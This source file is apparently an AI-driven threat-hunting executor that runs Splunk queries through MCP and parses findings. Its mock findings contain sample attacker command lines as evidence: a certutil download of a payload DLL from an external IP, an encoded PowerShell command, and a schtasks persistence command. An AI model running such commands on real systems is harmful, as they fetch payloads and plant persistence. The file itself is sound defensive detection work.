import Anthropic from "@anthropic-ai/sdk";
import { createMcpClient } from "@artifexai/mcp";
import type { Finding } from "./types.js";
import type { Hunt } from "./huntLoader.js";
import { config } from "./config.js";

export type LogLevel = "info" | "error";
export type LogCallback = (message: string, level?: LogLevel) => void;

export interface HuntExecutorConfig {
  mcpCommand: string;
  mcpArgs: string[];
  mcpEnv: Record<string, string>;
  timeRange: string;
}

const SYSTEM_PROMPT = `You are an expert cybersecurity threat hunting agent. Your role is to interpret threat hunting playbooks (provided as markdown) and execute them autonomously to identify security threats.

When given a hunt:
1. Read and understand the hunt's hypothesis and goals
2. Execute the suggested SPL queries using the execute_splunk_query tool
3. Analyze the results to identify suspicious activity
4. Generate findings based on what you actually discover

When you are done investigating, respond with a JSON array of findings inside a \`\`\`json code block. Each finding MUST have exactly these fields:

{
  "id": "string - unique finding ID e.g. F001, F002",
  "severity": "critical | high | medium | low",
  "title": "string - concise finding title describing the threat",
  "description": "string - detailed explanation of what was found and why it matters",
  "affectedEntities": ["string array - hostnames, user accounts, IPs, or systems involved"],
  "evidence": ["string array - top 5 most suspicious log entries, command lines, IPs, etc."],
  "queries": ["string array - the exact SPL queries you executed to find this"],
  "confidence": "number 0-100",
  "recommendation": "string - specific, actionable remediation steps"
}

Severity guidelines:
- critical: Active compromise, data exfiltration, ransomware
- high: Privilege escalation, lateral movement, exploitation attempts
- medium: Suspicious activity, policy violations, misconfigurations
- low: Informational findings, best practice gaps

Confidence guidelines:
- 90-100: Multiple strong indicators, clear malicious intent
- 70-89: Strong indicators but some ambiguity
- 50-69: Suspicious patterns but could be benign
- Below 50: Weak signals, likely false positives

If no suspicious activity is found, return an empty JSON array: \`\`\`json\n[]\n\`\`\`

IMPORTANT: Always respond with the JSON code block. Every finding must include all fields. The queries field must contain the actual SPL queries you ran.`;

const EXECUTE_QUERY_TOOL: Anthropic.Tool = {
  name: "execute_splunk_query",
  description: "Execute a Splunk SPL (Search Processing Language) query and return results. Use this to investigate security events and gather evidence.",
  input_schema: {
    type: "object",
    properties: {
      spl: {
        type: "string",
        description: "The Splunk SPL query to execute"
      },
      description: {
        type: "string",
        description: "Brief description of what this query is looking for (for logging)"
      }
    },
    required: ["spl", "description"]
  }
};

const MOCK_FINDINGS: Finding[] = [
  {
    id: "F001",
    severity: "high",
    title: "Suspicious PowerShell Encoded Command Execution",
    description: "Multiple hosts executed PowerShell with Base64-encoded commands, a common technique used by attackers to obfuscate malicious payloads. The encoded commands were found to download and execute remote scripts from external IP addresses.",
    affectedEntities: ["WORKSTATION-PC12", "SVR-APP-03", "10.0.1.45"],
    evidence: [
      "powershell.exe -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAA=",
      "Parent process: cmd.exe /c echo IEX | powershell -nop -",
      "Network connection to 185.220.101.34:443 immediately after execution",
      "Event ID 4688 - Process creation with suspicious command line",
      "Sysmon Event ID 1 - PowerShell spawned by WScript.exe"
    ],
    queries: [
      'index=windows sourcetype=WinEventLog:Security EventCode=4688 CommandLine="*powershell*-enc*"',
      'index=windows sourcetype=WinEventLog:Sysmon EventCode=1 Image="*powershell.exe" ParentImage="*wscript.exe"'
    ],
    confidence: 85,
    evidenceCount: 5,
    recommendation: "Immediately isolate affected hosts and perform forensic analysis. Block the external IP 185.220.101.34 at the firewall. Review PowerShell logging policies and enable Script Block Logging (Event ID 4104) across all endpoints."
  },
  {
    id: "F002",
    severity: "critical",
    title: "LOLBin Abuse - Certutil Used for File Download",
    description: "Certutil.exe, a legitimate Windows certificate utility, was used to download files from an external server. This is a well-known Living-off-the-Land (LOLBin) technique frequently used by threat actors to bypass application whitelisting and download malicious payloads.",
    affectedEntities: ["SVR-APP-03", "ADMIN-PC01", "svc_backup"],
    evidence: [
      "certutil.exe -urlcache -split -f http://45.33.32.156/payload.dll C:\\Users\\Public\\update.dll",
      "Execution under svc_backup account (service account misuse)",
      "File C:\\Users\\Public\\update.dll created 2 minutes after certutil execution",
      "Subsequent rundll32.exe execution loading the downloaded DLL",
      "DNS query for 45.33.32.156 from SVR-APP-03 at 03:14 UTC"
    ],
    queries: [
      'index=windows sourcetype=WinEventLog:Sysmon EventCode=1 Image="*certutil.exe" CommandLine="*urlcache*"',
      'index=windows sourcetype=WinEventLog:Sysmon EventCode=11 TargetFilename="C:\\Users\\Public\\*"',
      'index=network sourcetype=stream:dns query="45.33.32.156"'
    ],
    confidence: 92,
    evidenceCount: 5,
    recommendation: "Immediately contain SVR-APP-03 and ADMIN-PC01. Reset svc_backup account credentials. Block 45.33.32.156 at network perimeter. Analyze the downloaded DLL for malware indicators. Audit all service account usage and restrict certutil execution via AppLocker policies."
  },
  {
    id: "F003",
    severity: "medium",
    title: "Unusual Scheduled Task Creation for Persistence",
    description: "A scheduled task was created on multiple endpoints using schtasks.exe with execution parameters that suggest an attempt to establish persistence. The tasks are configured to run at system startup under SYSTEM privileges.",
    affectedEntities: ["WORKSTATION-PC12", "WORKSTATION-PC08"],
    evidence: [
      'schtasks /create /tn "WindowsUpdateCheck" /tr "C:\\ProgramData\\svchost.exe" /sc onstart /ru SYSTEM',
      "Suspicious binary path: C:\\ProgramData\\svchost.exe (legitimate svchost.exe resides in System32)",
      "Event ID 4698 - Scheduled task created by non-admin user"
    ],
    queries: [
      'index=windows sourcetype=WinEventLog:Security EventCode=4698 TaskContent="*ProgramData*"',
      'index=windows sourcetype=WinEventLog:Sysmon EventCode=1 Image="*schtasks.exe" CommandLine="*/create*"'
    ],
    confidence: 74,
    evidenceCount: 3,
    recommendation: "Review and remove the suspicious scheduled task 'WindowsUpdateCheck'. Investigate the binary at C:\\ProgramData\\svchost.exe. Implement scheduled task creation monitoring and restrict schtasks.exe usage to administrators via Group Policy."
  },
  {
    id: "F004",
    severity: "low",
    title: "Excessive Failed Login Attempts Detected",
    description: "Multiple accounts experienced a high volume of failed login attempts from internal IP addresses, potentially indicating password spraying or brute force activity. While this could be benign (e.g., misconfigured service accounts), it warrants investigation.",
    affectedEntities: ["DC-01", "10.0.0.5", "jsmith", "admin_temp"],
    evidence: [
      "47 failed logon events (Event ID 4625) for admin_temp in 5 minutes",
      "Source IP 10.0.0.5 targeting DC-01 with multiple usernames"
    ],
    queries: [
      'index=windows sourcetype=WinEventLog:Security EventCode=4625 | stats count by Account_Name, Source_Network_Address | where count > 20'
    ],
    confidence: 58,
    evidenceCount: 2,
    recommendation: "Verify whether admin_temp is a legitimate account. Implement account lockout policies. Investigate 10.0.0.5 to determine if it is compromised. Consider deploying multi-factor authentication for all privileged accounts."
  }
];

/**
 * Execute a hunt using Claude as an autonomous threat hunting agent
 */
export async function executeHunt(
  hunt: Hunt,
  executorConfig: HuntExecutorConfig,
  onLog?: LogCallback
): Promise<Finding[]> {
  const emit = onLog ?? (() => {});

  if (config.mockMode) {
    emit("MOCK MODE - returning dummy findings");
    await new Promise(resolve => setTimeout(resolve, 2000));
    return MOCK_FINDINGS.map(f => ({ ...f, id: `${hunt.id}-${f.id}` }));
  }

  if (!config.anthropicApiKey) {
    throw new Error("ANTHROPIC_API_KEY not configured");
  }

  const anthropic = new Anthropic({
    apiKey: config.anthropicApiKey
  });

  // Create MCP client for executing queries
  let mcpClient: Awaited<ReturnType<typeof createMcpClient>> | null = null;

  try {
    emit("Connecting to Splunk MCP for query execution...");
    mcpClient = await createMcpClient({
      name: "hunt-executor",
      version: "1.0.0",
      timeoutMs: 30000,
      transport: {
        type: "stdio",
        command: executorConfig.mcpCommand,
        args: executorConfig.mcpArgs,
        env: executorConfig.mcpEnv
      }
    });

    // Get available tools from MCP
    const mcpTools = await mcpClient.listTools();
    const queryTool = mcpTools.find((t) =>
      t.name.includes("query") || t.name.includes("search")
    );

    if (!queryTool) {
      throw new Error("No query tool found in Splunk MCP server");
    }

    emit("Sending hunt playbook to LLM for analysis...");

    // Initial message to Claude with the hunt
    const messages: Anthropic.MessageParam[] = [
      {
        role: "user",
        content: `Execute this threat hunt and generate findings if you discover suspicious activity:\n\nTime Range: Last ${executorConfig.timeRange} days\n\n${hunt.content}`
      }
    ];

    let findings: Finding[] = [];
    let continueLoop = true;
    let maxIterations = 10; // Prevent infinite loops
    let iterations = 0;
    const executedQueries: string[] = [];

    // Agentic loop - let Claude decide when it's done
    while (continueLoop && iterations < maxIterations) {
      iterations++;

      emit(`LLM thinking... (iteration ${iterations})`);

      const response = await anthropic.messages.create({
        model: "claude-sonnet-4-20250514",
        max_tokens: 8000,
        system: SYSTEM_PROMPT,
        messages,
        tools: [EXECUTE_QUERY_TOOL]
      });

      // Log any text blocks (LLM reasoning)
      for (const block of response.content) {
        if (block.type === "text" && block.text.trim()) {
          // Show a truncated preview of the LLM's thinking
          const preview = block.text.trim().substring(0, 150);
          emit(`LLM: ${preview}${block.text.length > 150 ? "..." : ""}`);
        }
      }

      // Add assistant's response to conversation
      messages.push({
        role: "assistant",
        content: response.content
      });

      // Handle tool calls
      if (response.stop_reason === "tool_use") {
        const toolResults: Anthropic.MessageParam = {
          role: "user",
          content: []
        };

        for (const block of response.content) {
          if (block.type === "tool_use" && block.name === "execute_splunk_query") {
            const input = block.input as { spl: string; description: string };

            emit(`Executing query: ${input.description}`);
            emit(`SPL: ${input.spl.substring(0, 120)}${input.spl.length > 120 ? "..." : ""}`);
            executedQueries.push(input.spl);

            try {
              // Try different argument strategies for the query tool
              const strategies = [
                { query: input.spl },
                { spl: input.spl },
                { search: input.spl }
              ];

              let result: any = null;
              let lastError: Error | null = null;

              for (const args of strategies) {
                try {
                  result = await mcpClient!.callTool(queryTool.name, args);
                  break;
                } catch (err) {
                  lastError = err as Error;
                }
              }

              if (!result) {
                throw lastError || new Error("All query strategies failed");
              }

              const resultStr = JSON.stringify(result, null, 2);
              const resultLines = resultStr.split("\n").length;
              emit(`Query returned ${resultLines} lines of results`);

              (toolResults.content as Anthropic.ToolResultBlockParam[]).push({
                type: "tool_result",
                tool_use_id: block.id,
                content: resultStr
              });
            } catch (err) {
              const errorMsg = err instanceof Error ? err.message : "Unknown error";
              emit(`Query failed: ${errorMsg}`, "error");
              (toolResults.content as Anthropic.ToolResultBlockParam[]).push({
                type: "tool_result",
                tool_use_id: block.id,
                content: `Error executing query: ${errorMsg}`,
                is_error: true
              });
            }
          }
        }

        messages.push(toolResults);
      } else if (response.stop_reason === "end_turn") {
        emit("LLM analysis complete — extracting findings...");
        // Claude is done - extract findings from final response
        for (const block of response.content) {
          if (block.type === "text") {
            findings = extractFindingsFromText(block.text, hunt, executedQueries);
          }
        }
        continueLoop = false;
      } else {
        emit(`Unexpected stop reason: ${response.stop_reason}`, "error");
        continueLoop = false;
      }
    }

    if (iterations >= maxIterations) {
      emit("Max iterations reached — stopping", "error");
    }

    emit(`Found ${findings.length} finding(s) after ${executedQueries.length} queries`);
    return findings;
  } finally {
    if (mcpClient) {
      await mcpClient.close();
    }
  }
}

/**
 * Extract Finding objects from Claude's text response
 * Looks for JSON-formatted findings in the response
 */
function extractFindingsFromText(text: string, hunt: Hunt, executedQueries: string[]): Finding[] {
  try {
    // Look for JSON array of findings in the response
    const jsonMatch = text.match(/```json\s*([\s\S]*?)\s*```/) ||
                      text.match(/\[[\s\S]*"id"[\s\S]*\]/);

    if (jsonMatch) {
      const jsonText = jsonMatch[1] || jsonMatch[0];
      const parsed = JSON.parse(jsonText);

      if (Array.isArray(parsed)) {
        return parsed.map((f, idx) => {
          const evidence = Array.isArray(f.evidence) ? f.evidence : [];
          const queries = Array.isArray(f.queries) && f.queries.length > 0
            ? f.queries
            : executedQueries;
          return {
            id: f.id || `${hunt.id}-F${String(idx + 1).padStart(3, "0")}`,
            severity: f.severity || "medium",
            title: f.title || "Untitled Finding",
            description: f.description || "",
            affectedEntities: Array.isArray(f.affectedEntities) ? f.affectedEntities : [],
            evidence,
            evidenceCount: evidence.length,
            confidence: typeof f.confidence === "number" ? f.confidence : 50,
            queries,
            recommendation: f.recommendation || ""
          };
        });
      }
    }

    // If no JSON found, return empty array
    return [];
  } catch (err) {
    console.error("[Hunt Executor] Failed to parse findings from response:", err);
    console.error("[Hunt Executor] Raw text:", text.substring(0, 500));
    return [];
  }
}
